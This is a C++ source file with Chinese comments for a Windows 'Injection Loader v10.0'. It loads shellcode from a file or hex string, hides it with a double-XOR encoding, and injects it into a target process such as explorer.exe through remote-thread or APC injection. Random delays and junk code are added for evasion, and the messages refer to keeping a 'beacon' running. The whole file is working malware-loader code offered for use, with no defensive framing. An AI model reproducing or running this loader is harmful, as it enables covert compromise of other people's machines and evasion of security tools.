#include <windows.h>
#include <iostream>
#include <vector>
#include <string>
#include <fstream>
#include <random>
#include <tlhelp32.h>
#include <wininet.h>

// 进程注入专用加载器 v10.0
class InjectionLoader {
private:
    std::vector<BYTE> shellcode;
    std::vector<BYTE> originalShellcode;
    BYTE key1, key2;
    
    // 随机数生成器
    std::random_device rd;
    std::mt19937 rng;
    
public:
    InjectionLoader() : rng(rd()) {
        key1 = static_cast<BYTE>(rng() % 256);
        key2 = static_cast<BYTE>(rng() % 256);
    }
    
    // 随机延迟
    void RandomDelay() {
        std::uniform_int_distribution<int> dist(100, 500);
        Sleep(dist(rng));
    }
    
    // 垃圾代码
    void JunkCode() {
        volatile int dummy = 0;
        for (int i = 0; i < (rng() % 10 + 5); i++) {
            dummy += i * (rng() % 100);
        }
    }
    
    // 双重XOR加密
    void DoubleXOREncrypt(std::vector<BYTE>& data, BYTE k1, BYTE k2) {
        for (size_t i = 0; i < data.size(); i++) {
            data[i] ^= k1;
            data[i] ^= k2;
        }
    }
    
    // 双重XOR解密
    void DoubleXORDecrypt(std::vector<BYTE>& data, BYTE k1, BYTE k2) {
        for (size_t i = 0; i < data.size(); i++) {
            data[i] ^= k2;
            data[i] ^= k1;
        }
    }
    
    // 获取进程ID
    DWORD GetProcessIdByName(const std::wstring& processName) {
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
        
        PROCESSENTRY32W pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32W);
        
        if (Process32FirstW(hSnapshot, &pe32)) {
            do {
                if (processName == pe32.szExeFile) {
                    CloseHandle(hSnapshot);
                    return pe32.th32ProcessID;
                }
            } while (Process32NextW(hSnapshot, &pe32));
        }
        
        CloseHandle(hSnapshot);
        return 0;
    }
    
    // 从文件加载shellcode
    bool LoadFromFile(const std::string& filename) {
        std::ifstream file(filename, std::ios::binary);
        if (!file.is_open()) {
            std::cout << "[-] Failed to open file: " << filename << std::endl;
            return false;
        }
        
        file.seekg(0, std::ios::end);
        size_t size = file.tellg();
        file.seekg(0, std::ios::beg);
        
        originalShellcode.resize(size);
        file.read(reinterpret_cast<char*>(originalShellcode.data()), size);
        file.close();
        
        // 复制并加密
        shellcode = originalShellcode;
        DoubleXOREncrypt(shellcode, key1, key2);
        
        std::cout << "[+] Shellcode loaded and encrypted (" << size << " bytes)" << std::endl;
        return true;
    }
    
    // 从十六进制字符串加载
    bool LoadFromHex(const std::string& hexString) {
        if (hexString.length() % 2 != 0) return false;
        
        originalShellcode.clear();
        for (size_t i = 0; i < hexString.length(); i += 2) {
            std::string byteString = hexString.substr(i, 2);
            BYTE byte = static_cast<BYTE>(strtol(byteString.c_str(), nullptr, 16));
            originalShellcode.push_back(byte);
        }
        
        shellcode = originalShellcode;
        DoubleXOREncrypt(shellcode, key1, key2);
        
        std::cout << "[+] Shellcode loaded from hex (" << originalShellcode.size() << " bytes)" << std::endl;
        return true;
    }
    
    // 经典进程注入
    bool ClassicInject(DWORD processId) {
        if (shellcode.empty()) return false;
        
        RandomDelay();
        JunkCode();
        
        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
        if (!hProcess) {
            std::cout << "[-] Failed to open target process" << std::endl;
            return false;
        }
        
        // 解密shellcode
        std::vector<BYTE> decryptedShellcode = shellcode;
        DoubleXORDecrypt(decryptedShellcode, key1, key2);
        
        // 在目标进程中分配内存
        LPVOID pRemoteCode = VirtualAllocEx(hProcess, NULL, decryptedShellcode.size(),
                                          MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!pRemoteCode) {
            std::cout << "[-] Failed to allocate memory in target process" << std::endl;
            CloseHandle(hProcess);
            return false;
        }
        
        // 写入shellcode
        SIZE_T bytesWritten;
        if (!WriteProcessMemory(hProcess, pRemoteCode, decryptedShellcode.data(),
                              decryptedShellcode.size(), &bytesWritten)) {
            std::cout << "[-] Failed to write shellcode to target process" << std::endl;
            VirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }
        
        // 修改内存保护
        DWORD oldProtect;
        VirtualProtectEx(hProcess, pRemoteCode, decryptedShellcode.size(),
                        PAGE_EXECUTE_READ, &oldProtect);
        
        RandomDelay();
        
        // 创建远程线程
        HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
                                          (LPTHREAD_START_ROUTINE)pRemoteCode,
                                          NULL, 0, NULL);
        if (!hThread) {
            std::cout << "[-] Failed to create remote thread" << std::endl;
            VirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }
        
        std::cout << "[+] Shellcode injected successfully" << std::endl;
        std::cout << "[*] Remote thread created in target process" << std::endl;
        
        // 等待一下确认注入成功
        DWORD waitResult = WaitForSingleObject(hThread, 2000);
        if (waitResult == WAIT_TIMEOUT) {
            std::cout << "[+] Injection successful - beacon running in target process" << std::endl;
        }
        
        // 清理句柄但不释放内存（让beacon持续运行）
        CloseHandle(hThread);
        CloseHandle(hProcess);
        
        // 清理本地解密的shellcode
        SecureZeroMemory(decryptedShellcode.data(), decryptedShellcode.size());
        
        return true;
    }
    
    // APC注入
    bool APCInject(DWORD processId) {
        if (shellcode.empty()) return false;
        
        RandomDelay();
        JunkCode();
        
        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
        if (!hProcess) {
            std::cout << "[-] Failed to open target process" << std::endl;
            return false;
        }
        
        // 解密shellcode
        std::vector<BYTE> decryptedShellcode = shellcode;
        DoubleXORDecrypt(decryptedShellcode, key1, key2);
        
        // 分配内存
        LPVOID pRemoteCode = VirtualAllocEx(hProcess, NULL, decryptedShellcode.size(),
                                          MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!pRemoteCode) {
            std::cout << "[-] Failed to allocate memory in target process" << std::endl;
            CloseHandle(hProcess);
            return false;
        }
        
        // 写入shellcode
        SIZE_T bytesWritten;
        if (!WriteProcessMemory(hProcess, pRemoteCode, decryptedShellcode.data(),
                              decryptedShellcode.size(), &bytesWritten)) {
            std::cout << "[-] Failed to write shellcode to target process" << std::endl;
            VirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }
        
        // 修改内存保护
        DWORD oldProtect;
        VirtualProtectEx(hProcess, pRemoteCode, decryptedShellcode.size(),
                        PAGE_EXECUTE_READ, &oldProtect);
        
        // 获取目标进程的线程
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) {
            VirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }
        
        THREADENTRY32 te32;
        te32.dwSize = sizeof(THREADENTRY32);
        
        bool injected = false;
        if (Thread32First(hSnapshot, &te32)) {
            do {
                if (te32.th32OwnerProcessID == processId) {
                    HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, te32.th32ThreadID);
                    if (hThread) {
                        if (QueueUserAPC((PAPCFUNC)pRemoteCode, hThread, 0)) {
                            std::cout << "[+] APC queued to thread " << te32.th32ThreadID << std::endl;
                            injected = true;
                        }
                        CloseHandle(hThread);
                        if (injected) break;
                    }
                }
            } while (Thread32Next(hSnapshot, &te32));
        }
        
        CloseHandle(hSnapshot);
        CloseHandle(hProcess);
        
        if (injected) {
            std::cout << "[+] APC injection successful" << std::endl;
            std::cout << "[*] Beacon will execute when target thread enters alertable state" << std::endl;
        } else {
            std::cout << "[-] Failed to queue APC" << std::endl;
        }
        
        // 清理本地解密的shellcode
        SecureZeroMemory(decryptedShellcode.data(), decryptedShellcode.size());
        
        return injected;
    }
    
    // 注入到指定进程
    bool InjectToProcess(const std::wstring& processName, const std::string& method = "classic") {
        DWORD processId = GetProcessIdByName(processName);
        if (processId == 0) {
            std::cout << "[-] Target process not found: ";
            std::wcout << processName << std::endl;
            return false;
        }
        
        std::cout << "[*] Target process found - PID: " << processId << std::endl;
        std::cout << "[*] Using injection method: " << method << std::endl;
        
        if (method == "apc") {
            return APCInject(processId);
        } else {
            return ClassicInject(processId);
        }
    }
};

void PrintUsage() {
    std::cout << "Injection Loader v10.0 - Process Injection Specialist" << std::endl;
    std::cout << "=====================================================" << std::endl;
    std::cout << "Usage:" << std::endl;
    std::cout << "  -i <file>     Load shellcode from binary file" << std::endl;
    std::cout << "  -h <hex>      Load shellcode from hex string" << std::endl;
    std::cout << "  -p <process>  Target process name (default: explorer.exe)" << std::endl;
    std::cout << "  -m <method>   Injection method: classic|apc (default: classic)" << std::endl;
    std::cout << std::endl;
    std::cout << "Examples:" << std::endl;
    std::cout << "  loader_v10.exe -i shellcode.bin" << std::endl;
    std::cout << "  loader_v10.exe -i shellcode.bin -p notepad.exe -m apc" << std::endl;
    std::cout << "  loader_v10.exe -h 4831c0..." << std::endl;
}

int main(int argc, char* argv[]) {
    std::cout << "Injection Loader v10.0 - Process Injection Specialist" << std::endl;
    std::cout << "=====================================================" << std::endl;
    
    if (argc < 3) {
        PrintUsage();
        return 1;
    }
    
    InjectionLoader loader;
    std::wstring targetProcess = L"explorer.exe";
    std::string method = "classic";
    bool shellcodeLoaded = false;
    
    // 解析命令行参数
    for (int i = 1; i < argc; i++) {
        std::string arg = argv[i];
        
        if (arg == "-i" && i + 1 < argc) {
            if (loader.LoadFromFile(argv[++i])) {
                shellcodeLoaded = true;
            }
        }
        else if (arg == "-h" && i + 1 < argc) {
            if (loader.LoadFromHex(argv[++i])) {
                shellcodeLoaded = true;
            }
        }
        else if (arg == "-p" && i + 1 < argc) {
            std::string processName = argv[++i];
            targetProcess = std::wstring(processName.begin(), processName.end());
        }
        else if (arg == "-m" && i + 1 < argc) {
            method = argv[++i];
        }
    }
    
    if (!shellcodeLoaded) {
        std::cout << "[-] No shellcode loaded" << std::endl;
        return 1;
    }
    
    std::cout << "[*] Target process: ";
    std::wcout << targetProcess << std::endl;
    std::cout << "[*] Injection method: " << method << std::endl;
    std::cout << "[*] Starting injection process..." << std::endl;
    
    if (loader.InjectToProcess(targetProcess, method)) {
        std::cout << "[+] Injection completed successfully" << std::endl;
        std::cout << "[*] Beacon should be running in target process" << std::endl;
        std::cout << "[*] Loader exiting - beacon continues independently" << std::endl;
        return 0;
    } else {
        std::cout << "[-] Injection failed" << std::endl;
        return 1;
    }
}